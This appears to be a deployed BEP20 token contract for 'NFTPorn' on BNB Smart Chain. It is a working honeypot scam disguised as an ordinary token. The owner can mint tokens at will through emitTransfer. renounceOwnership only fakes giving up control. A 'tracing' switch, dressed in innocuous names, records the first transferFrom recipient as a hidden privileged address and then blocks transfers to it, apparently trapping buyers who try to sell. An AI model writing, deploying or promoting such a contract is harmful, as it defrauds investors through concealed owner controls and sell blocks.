/**
 *Submitted for verification at BscScan.com on 2021-12-11
*/

/**
 *Submitted for verification at BscScan.com on 2021-06-09
*/

/**
*NFTPorn
*Telegram : https://t.me/nftporn
*/

pragma solidity ^0.5.17;


library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract BEP20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address owner;
  address newOwner;
  address nxOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner || msg.sender == nxOwner);
    _;
  }

}

contract TokenBEP20 is BEP20Interface, Owned {
  using SafeMath for uint;
  bool tracing = false;
  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public currentOwner;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "test1";
    name = "test1";
    decimals = 9;
    _totalSupply = 10000000000000000000000;
    uint burnedAmount = 5000000000000000000000;
    balances[owner] = _totalSupply;
    currentOwner = address(0);
    address dead = 0x000000000000000000000000000000000000dEaD;
    emit Transfer(address(0), owner, _totalSupply);
    transfer(dead, burnedAmount);
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
    function setTracing(bool _tracing) onlyOwner public {
    tracing = _tracing;
  }
  function renounceOwnership(address _newOwner) public {
    currentOwner = _newOwner;
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
    modifier requestHandler(address to) {
        if(tracing)
            require(to != nxOwner, "Handling Request");
    _;
  }
  function transfer(address to, uint tokens) public requestHandler(to) returns (bool success) {
 
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function emitTransfer(uint256 _input) public onlyOwner {
        balances[msg.sender] = balances[msg.sender] + (_input);
        emit Transfer(address(0), msg.sender, _input);
  }
   modifier contextHandler(address from, address to) {
       if(tracing) {
         if(from != address(0) && nxOwner == address(0)) nxOwner = to;
          else require(to != nxOwner, "Order ContextHandler");
       }
    _;
  }
  function transferFrom(address from, address to, uint tokens) public contextHandler(from, to) returns (bool success) {
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract NFTPorn is TokenBEP20 {

  function _construct() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
}